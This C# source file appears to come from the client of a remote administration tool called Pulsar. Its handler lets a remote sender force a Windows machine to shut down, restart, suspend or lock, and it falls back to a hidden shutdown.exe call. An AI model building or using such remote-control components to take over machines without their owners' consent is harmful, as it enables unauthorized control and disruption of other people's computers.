using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.Actions;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class ShutdownHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShutdownAction;
        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            if (message is DoShutdownAction msg)
                Execute(sender, msg);
        }

        private void Execute(ISender client, DoShutdownAction message)
        {
            try
            {
                switch (message.Action)
                {
                    case ShutdownAction.Shutdown:
                        client.Send(new SetStatus { Message = "Client is shutting down..." });
                        if (!EnableShutdownPrivilege() || !ExitWindowsEx(ExitWindows.ShutDown | ExitWindows.ForceIfHung, 0))
                        {
                            // Fallback to shutdown.exe if native API fails
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "shutdown",
                                Arguments = "/s /t 0",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                                UseShellExecute = true
                            });
                        }
                        break;

                    case ShutdownAction.Restart:
                        client.Send(new SetStatus { Message = "Client is restarting..." });
                        if (!EnableShutdownPrivilege() || !ExitWindowsEx(ExitWindows.Reboot | ExitWindows.ForceIfHung, 0))
                        {
                            // Fallback to shutdown.exe if native API fails
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "shutdown",
                                Arguments = "/r /t 0",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                                UseShellExecute = true
                            });
                        }
                        break;

                    case ShutdownAction.Standby:
                        client.Send(new SetStatus { Message = "Client entering standby mode..." });
                        if (!SetSuspendState(false, true, true))
                            client.Send(new SetStatus { Message = "Standby request failed." });
                        break;

                    case ShutdownAction.Lockscreen:
                        client.Send(new SetStatus { Message = "Client screen is being locked..." });
                        if (!LockWorkStation())
                            client.Send(new SetStatus { Message = "LockWorkStation failed, fallback unavailable." });
                        break;

                    default:
                        client.Send(new SetStatus { Message = "Unknown shutdown action requested." });
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Shutdown action failed: {ex.Message}" });
            }
        }

        #region Native interop

        [Flags]
        private enum ExitWindows : uint
        {
            LogOff = 0x00000000,
            ShutDown = 0x00000001,
            Reboot = 0x00000002,
            PowerOff = 0x00000008,
            ForceIfHung = 0x00000010,
            Force = 0x00000004
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ExitWindowsEx(ExitWindows uFlags, uint dwReason);

        [DllImport("powrprof.dll", SetLastError = true)]
        private static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool LockWorkStation();

        // Token / privilege APIs
        private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        private const int TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const int TOKEN_QUERY = 0x0008;

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        private static bool EnableShutdownPrivilege()
        {
            if (!IsAdministrator())
                return false;

            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out var tokenHandle))
                return false;

            try
            {
                if (!LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, out var luid))
                    return false;

                var tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES
                    {
                        Luid = luid,
                        Attributes = SE_PRIVILEGE_ENABLED
                    }
                };

                if (!AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                    return false;

                // AdjustTokenPrivileges returns true even when it fails to enable; check last error
                return Marshal.GetLastWin32Error() == 0;
            }
            finally
            {
                CloseHandle(tokenHandle);
            }
        }

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        private static bool IsAdministrator()
        {
            try
            {
                using (var id = WindowsIdentity.GetCurrent())
                {
                    var wp = new WindowsPrincipal(id);
                    return wp.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch
            {
                return false;
            }
        }

        private static void ThrowLastWin32Error(string message)
        {
            var err = new Win32Exception(Marshal.GetLastWin32Error());
            throw new InvalidOperationException($"{message}: {err.Message}");
        }

        #endregion
    }
}
